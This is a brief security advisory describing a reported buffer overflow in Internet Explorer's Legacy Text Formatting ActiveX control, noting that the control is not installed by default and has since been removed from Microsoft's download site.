A buffer overflow vulnerability has been reported in Microsoft Internet Explorer's Legacy Text Formatting ActiveX control. The Legacy Text Formatting ActiveX control is used by Internet Explorer to display specially formatted text. Reportedly, the ActiveX control is vulnerable to a buffer overflow condition.

Microsoft has reported that the specific ActiveX control is not installed by default as part of Internet Explorer. The control, however, will be downloaded as it is needed from a Microsoft Web Site.

The control was retained by Microsoft for backward compatibility and has since been removed from the Web site.
